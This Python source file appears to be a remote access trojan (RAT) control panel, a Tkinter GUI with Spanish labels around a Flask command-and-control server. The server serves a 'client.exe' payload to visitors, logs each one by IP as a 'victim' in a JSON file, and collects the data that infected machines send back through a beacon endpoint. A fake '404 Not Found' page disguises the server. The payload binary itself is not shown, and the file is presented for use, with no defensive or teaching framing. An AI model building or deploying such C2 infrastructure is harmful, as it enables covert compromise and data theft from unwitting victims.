import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
import threading
import subprocess
import time
import json
import webbrowser
import os
from flask import Flask, request, jsonify, send_file

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5000
DB_FILE = "victims.json"
PAYLOAD_NAME = "client.exe"

app = Flask(__name__)

def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, 'w') as f:
            json.dump({}, f)
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

@app.route('/')
def index():
    return send_file("static/index.html")

@app.route('/get_payload')
def get_payload():
    user_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    victim_id = user_ip.replace('.', '_')
    db = load_db()
    
    if victim_id not in db:
        db[victim_id] = {'ip': user_ip, 'status': 'connected', 'last_seen': time.time()}
        save_db(db)
        return send_file(PAYLOAD_NAME, as_attachment=True, download_name=PAYLOAD_NAME)
    
    return "Not Found", 404

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json()
    user_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    victim_id = user_ip.replace('.', '_')
    db = load_db()
    
    if victim_id in db:
        db[victim_id]['last_seen'] = time.time()
        if data:
            db[victim_id]['data'] = data
        save_db(db)
        return jsonify({"status": "ok"})
    
    return jsonify({"status": "error"}), 404

class ControlPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("synq1ixx RAT Control Panel")
        self.root.geometry("700x500")
        
        self.server_thread = None
        self.server_running = False
        
        main_frame = tk.Frame(root, padx=10, pady=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        control_frame = tk.Frame(main_frame)
        control_frame.pack(fill=tk.X)

        self.start_button = tk.Button(control_frame, text="Iniciar Servidor", command=self.start_server, bg="green", fg="white")
        self.start_button.pack(side=tk.LEFT, padx=5)

        self.stop_button = tk.Button(control_frame, text="Parar Servidor", command=self.stop_server, bg="red", fg="white", state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        self.status_label = tk.Label(control_frame, text="Servidor Detenido", fg="red")
        self.status_label.pack(side=tk.LEFT, padx=20)

        link_frame = tk.Frame(main_frame)
        link_frame.pack(fill=tk.X, pady=10)
        tk.Label(link_frame, text="Tu enlace de acceso:").pack(side=tk.LEFT)
        self.link_entry = tk.Entry(link_frame, width=50)
        self.link_entry.pack(side=tk.LEFT, padx=10)
        self.link_entry.insert(0, f"http://{SERVER_HOST}:{SERVER_PORT}")
        self.copy_button = tk.Button(link_frame, text="Copiar", command=self.copy_link)
        self.copy_button.pack(side=tk.LEFT)

        tk.Label(main_frame, text="Víctimas Conectadas:").pack(anchor=tk.W)
        self.victim_log = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD, width=80, height=20)
        self.victim_log.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.update_log()

    def start_server(self):
        if not self.server_running:
            self.server_thread = threading.Thread(target=self.run_flask, daemon=True)
            self.server_thread.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.status_label.config(text="Servidor En Línea", fg="green")
            messagebox.showinfo("Servidor", "Servidor iniciado. El enlace está activo.")

    def stop_server(self):
        messagebox.showinfo("Servidor", "Para detener el servidor, cierra esta ventana.")
        self.root.quit()

    def run_flask(self):
        if not os.path.exists('static'):
            os.makedirs('static')
        with open('static/index.html', 'w') as f:
            f.write("<html><body><h1>404 Not Found</h1></body></html>")
        app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, use_reloader=False)

    def copy_link(self):
        link = self.link_entry.get()
        self.root.clipboard_clear()
        self.root.clipboard_append(link)
        messagebox.showinfo("Enlace", "Enlace copiado al portapapeles.")

    def update_log(self):
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                db = json.load(f)
            
            self.victim_log.delete(1.0, tk.END)
            if not db:
                self.victim_log.insert(tk.END, "No hay víctimas conectadas todavía.\n")
            else:
                for victim_id, info in db.items():
                    ip = info.get('ip', 'N/A')
                    status = info.get('status', 'N/A')
                    last_seen_ts = info.get('last_seen', 0)
                    last_seen_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_seen_ts))
                    
                    self.victim_log.insert(tk.END, f"ID: {victim_id}\n")
                    self.victim_log.insert(tk.END, f"  IP: {ip}\n")
                    self.victim_log.insert(tk.END, f"  Estado: {status}\n")
                    self.victim_log.insert(tk.END, f"  Última vez visto: {last_seen_time}\n")
                    self.victim_log.insert(tk.END, "-" * 30 + "\n")
        
        self.root.after(5000, self.update_log)

if __name__ == "__main__":
    root = tk.Tk()
    app = ControlPanel(root)
    root.mainloop()